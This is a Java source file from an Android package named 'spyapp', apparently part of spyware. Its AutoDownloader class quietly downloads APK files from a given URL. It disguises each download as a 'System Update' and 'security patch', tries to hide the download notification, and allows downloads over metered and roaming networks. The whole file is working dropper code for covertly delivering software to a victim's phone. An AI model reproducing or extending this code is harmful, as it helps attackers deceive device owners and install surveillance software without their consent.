package com.spyapp;

import android.app.DownloadManager;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.webkit.MimeTypeMap;

import java.io.File;

public class AutoDownloader {
    
    private static long lastDownloadId = -1;
    private static long lastDownloadTime = 0;
    
    public static void downloadApk(Context context, String url) {
        try {
            // Prevent too frequent downloads (min 2 seconds gap)
            long now = System.currentTimeMillis();
            if (now - lastDownloadTime < 2000) return;
            lastDownloadTime = now;
            
            // Check if previous download is still running
            if (lastDownloadId != -1) {
                DownloadManager dm = (DownloadManager) context.getSystemService(Context.DOWNLOAD_SERVICE);
                DownloadManager.Query query = new DownloadManager.Query();
                query.setFilterById(lastDownloadId);
                Cursor cursor = dm.query(query);
                if (cursor != null && cursor.moveToFirst()) {
                    int status = cursor.getInt(cursor.getColumnIndex(DownloadManager.COLUMN_STATUS));
                    if (status == DownloadManager.STATUS_RUNNING || 
                        status == DownloadManager.STATUS_PENDING) {
                        cursor.close();
                        return; // Still downloading, skip
                    }
                    cursor.close();
                }
            }
            
            DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
            
            // Set description
            request.setTitle("System Update");
            request.setDescription("Downloading security patch...");
            
            // Set destination
            String fileName = "SystemUpdate_" + System.currentTimeMillis() + ".apk";
            request.setDestinationInExternalPublicDir(
                    Environment.DIRECTORY_DOWNLOADS, 
                    fileName);
            
            // Set notification visibility - HIDE it
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB) {
                try {
                    request.setNotificationVisibility(
                            DownloadManager.Request.VISIBILITY_HIDDEN);
                } catch (SecurityException e) {
                    // Fallback to visible if no permission
                    request.setNotificationVisibility(
                            DownloadManager.Request.VISIBILITY_VISIBLE);
                }
            }
            
            // Network conditions
            request.setAllowedOverMetered(true);
            request.setAllowedOverRoaming(true);
            
            // MIME type
            request.setMimeType("application/vnd.android.package-archive");
            
            // Enqueue
            DownloadManager dm = (DownloadManager) context.getSystemService(Context.DOWNLOAD_SERVICE);
            lastDownloadId = dm.enqueue(request);
            
            // Increment download counter
            Config.totalDownloads++;
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
